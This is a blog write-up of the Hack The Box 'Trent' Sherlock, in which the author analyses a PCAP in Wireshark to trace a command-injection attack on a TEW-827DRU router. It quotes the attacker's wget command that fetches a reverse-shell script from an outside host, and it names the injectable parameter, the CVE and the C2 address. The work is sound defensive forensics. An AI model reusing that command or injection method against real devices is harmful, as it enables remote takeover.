---
title: PCAP Analysis - Hack The Box Sherlock
layout: post
categories: [projects, write-ups]
date: 2025-05-26 00:00:00 +0530
description: This writeup is a walkthrough of the “Trent” Sherlock from Hack The Box, an investigative challenge testing defensive security skills. Using Wireshark, I analyzed a PCAP file to uncover an attacker’s Techniques, Tactics, and Procedures (TTPs) during a lateral movement attack targeting router firmware.
---

# PCAP Analysis: Hack The Box Sherlock Trent

*Published: May 26, 2025*

## Project Overview

This writeup is a walkthrough of the “Trent” Sherlock from Hack The Box, an investigative challenge testing defensive security skills. Using Wireshark, I analyzed a PCAP file to uncover an attacker’s Techniques, Tactics, and Procedures (TTPs) during a lateral movement attack targeting router firmware. The analysis reveals the attacker’s IP, compromised router details, login attempts, and exploitation of a remote code execution vulnerability, demonstrating my network forensics and threat detection capabilities critical for a Security Operations Center (SOC) analyst role.

## Sherlock Scenario

The SOC team detected suspicious lateral movement within the network, targeting router firmware. Anomalous traffic patterns and command execution on the router suggest an internal attacker gained unauthorized access and is attempting further exploitation. The task is to analyze network traffic logs from an impacted machine to identify the attacker’s TTPs.

**Challenge**: Hack The Box Sherlock Trent

## Tools Used

- **Wireshark**: For PCAP analysis, packet filtering, and TCP stream reconstruction.
- **Web Browser**: To research router vulnerabilities and CVE details.

## Analysis Process

The analysis addresses 12 questions to unravel the attack. Below are the findings, supported by Wireshark screenshots and filters.

### Q1: Attacker’s Initial IP Address

Loaded the PCAP in Wireshark and navigated to *Statistics > Conversations > IPv4*. Sorting packets from highest to lowest showed significant traffic between the router (192.168.10.1) and the attacker (192.168.10.2).

**Answer**: 192.168.10.2

### Q2: Model Name of Compromised Router

Filtered HTTP packets between the router and attacker using `ip.addr==192.168.10.2 && ip.addr==192.168.10.1 && http`. Following the TCP stream of packet 13 (first HTTP packet) revealed the router’s model in the response.

**Answer**: TEW-827DRU

### Q3: Number of Failed Login Attempts

Filtered HTTP POST requests from the attacker to the router using `ip.src==192.168.10.2 && ip.dst==192.168.10.1 && http.request.method==POST`. The first three POST requests failed, but the fourth (packet 22826) succeeded, indicating two failed attempts.

**Answer**: 2 failed login attempts

### Q4: UTC Time of Successful Login

From Q3, packet 22826 marked the successful login. Changed Wireshark’s time format (*View > Time Display Format > UTC Date and Time of Day*) to view the timestamp.

**Answer**: 2024-05-01 15:53:27

### Q5: Length of Successful Login Password

From Q3, the successful login packet (22826) showed the credentials. The password field was empty.

**Answer**: 0 (empty string)

### Q6: HTTP Parameter for Remote Code Execution

Examined POST requests post-login, identifying commands passed via the `usbapps.config.smb_admin_name` parameter in HTTP forms, enabling remote code execution.

**Answer**: usbapps.config.smb_admin_name

### Q7: CVE Number of Exploited Vulnerability

Researched the router model (TEW-827DRU) and RCE vulnerability, identifying the associated CVE.

**Answer**: CVE-2024-28353

### Q8: Current Firmware Version

Found the firmware version in the router’s HTTP response.

**Answer**: 2.10B01

### Q9: First Command Executed via Vulnerability

Reviewed POST requests after login, identifying the first command in the `usbapps.config.smb_admin_name` parameter.

**Answer**: whoami

### Q10: Command to Download Reverse Shell

Identified a POST request with a `wget` command to download a reverse shell script.

**Answer**: wget http://35.159.25.253:8000/a1l4m.sh

### Q11: Server Response for Typo in Injection

Followed HTTP streams of failed `wget` attempts, noting the server’s response to a typo.

**Answer**: Access to this resource is forbidden

### Q12: C2 Server IP and Port

Analyzed the successful reverse shell download (packet with `a1l4m.sh`). Followed the HTTP stream to extract the script, revealing a reverse shell command pointing to the C2 server.

**Answer**: 35.159.25.253:41143

## Conclusion

This PCAP analysis of the Hack The Box Sherlock “Trent” demonstrates my ability to investigate complex network attacks, from identifying attacker origins to uncovering exploited vulnerabilities and C2 infrastructure. By dissecting the PCAP file with Wireshark, I mapped the attacker’s TTPs, including brute-force attempts, remote code execution via a vulnerable HTTP parameter, and deployment of a reverse shell. This project highlights my proficiency in network forensics, a core SOC analyst skill, and my ability to document findings clearly for incident response.

### Lessons Learned

- **Wireshark Mastery**: Gained expertise in advanced Wireshark features, such as TCP stream analysis, HTTP filtering (`http.request.method==POST`), and conversation statistics, enabling precise identification of malicious traffic.
- **Attack Lifecycle Understanding**: Learned to trace an attacker’s progression from initial access (login attempts) to exploitation (RCE) and persistence (reverse shell), enhancing my ability to detect multi-stage attacks.
- **Vulnerability Research**: Improved skills in correlating network artifacts (e.g., router model) with external intelligence (e.g., CVE-2024-28353), critical for assessing attack impact.
- **Attention to Detail**: Mastered analyzing subtle differences in HTTP responses (e.g., “Access to this resource is forbidden”) to identify attacker errors, refining my investigative precision.

### Skills Demonstrated

- **Network Forensics**: Proficiently analyzed PCAP files to extract attacker IPs, credentials, and commands, supporting rapid threat identification.
- **Threat Detection**: Identified malicious TTPs, including RCE and C2 communication, aligning with SOC incident response workflows.
- **Tool Proficiency**: Leveraged Wireshark for deep packet analysis and integrated web research for vulnerability context, showcasing technical versatility.
- **Clear Communication**: Documented complex findings in an accessible format, ideal for SOC reports and stakeholder briefings.
